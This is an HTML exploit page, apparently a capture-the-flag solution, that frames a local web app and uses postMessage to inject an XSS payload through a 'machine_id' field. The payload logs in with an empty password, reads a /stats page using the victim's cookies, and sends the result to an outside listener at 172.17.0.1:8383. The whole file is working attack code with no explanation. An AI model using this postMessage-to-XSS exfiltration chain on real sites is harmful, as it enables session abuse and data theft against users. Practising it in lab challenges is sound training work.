<!DOCTYPE html>
<html>
<body>
<iframe id="fr" src="http://localhost:1337" style="width:100%;height:500px"></iframe>
<script>
  const ip = "172.17.0.1";
  const port = "8383";

  const payload = "<img src=x onerror=\""
    + "fetch('http://localhost:1337/login',{"
    + "method:'POST',credentials:'include',"
    + "headers:{'Content-Type':'application/json'},"
    + "body:'{\\\"username\\\":\\\"lean@tornado-service.htb\\\",\\\"password\\\":\\\"\\\"}'"
    + "})"
    + ".then(()=>fetch('http://localhost:1337/stats',{credentials:'include'}))"
    + ".then(r=>r.text())"
    + ".then(d=>fetch('http://" + ip + ":" + port + "/?flag='+encodeURIComponent(d)))"
    + "\">";

  document.getElementById('fr').onload = function() {
    setTimeout(() => {
      document.getElementById('fr').contentWindow.postMessage({
        machine_id: payload,
        ip_address: '1.1.1.1',
        status: 'active'
      }, '*');
    }, 2000);
  };
</script>
</body>
</html>